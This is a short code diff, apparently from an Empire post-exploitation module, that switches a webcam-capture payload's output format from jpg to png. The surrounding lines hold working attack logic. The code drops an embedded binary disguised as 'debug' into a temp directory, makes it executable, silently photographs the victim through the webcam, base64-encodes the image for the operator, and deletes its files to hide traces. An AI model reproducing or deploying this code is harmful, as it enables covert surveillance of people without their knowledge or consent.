@@ -17,7 +17,7 @@ class Module:
             'Background' : False,
 
             # File extension to save the file as
-            'OutputExtension' : "jpg",
+            'OutputExtension' : "png",
 
             # if the module needs administrative privileges
             'NeedsAdmin' : False,
@@ -83,7 +83,7 @@ f.write(base64.b64decode(imageSnapb64))
 f.close()
 run_command('chmod a+x %sdebug')
 # take the webcam shot, waiting 3 seconds for camera to warm up
-run_command('%sdebug -w 3.00 %sdebug.jpg')
+run_command('%sdebug -w 3.00 %sdebug.png')
 time.sleep(4)
 # base64 up resulting file, delete the file and binary, return the base64 of the png output
 #   mocked from the Empire screenshot module
@@ -91,7 +91,7 @@ f = open('%sdebug.png', 'rb')
 data = f.read()
 f.close()
 run_command('rm -f %sdebug')
-run_command('rm -f %sdebug.jpg')
+run_command('rm -f %sdebug.png')
 print data
 """ % (tempDir, tempDir, tempDir, tempDir, tempDir, tempDir, tempDir)
 
